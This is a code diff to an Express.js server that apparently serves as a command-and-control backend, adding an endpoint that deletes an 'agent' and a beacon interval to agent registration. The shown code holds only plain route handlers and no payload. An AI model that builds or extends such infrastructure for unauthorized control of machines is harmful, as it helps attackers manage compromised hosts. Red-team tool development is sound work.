@@ -60,6 +60,18 @@ app.get('/api/agents/:agentId/tasks', (req, res) => {
   }
 })
 
+app.delete('/api/agents/:agentId', (req, res) => {
+  const agentId = parseInt(req.params.agentId)
+  const status = agentStore.deleteAgentById(agentId)
+  if (status) {
+    res.status(200).json(agentId)
+  } else {
+    res.status(404).json({
+      message: 'agent does not exist'
+    })
+  }
+})
+
 // Interact with tasks
 app.post('/api/tasks', (req, res) => {
   const { command, agentId } = req.body
@@ -95,8 +107,8 @@ app.get('/api/tasks/:taskId', (req, res) => {
 
 // Beacon
 app.post('/beacon', (req, res) => {
-  const [ip, os, profile] = req.body.split(/\|{2}/)
-  const agentId = agentStore.addAgent(os, ip, profile)
+  const [ip, os, profile, interval] = req.body.split(/\|{2}/)
+  const agentId = agentStore.addAgent(os, ip, profile, interval)
   res.status(200).send(`${agentId}`)
 })
 
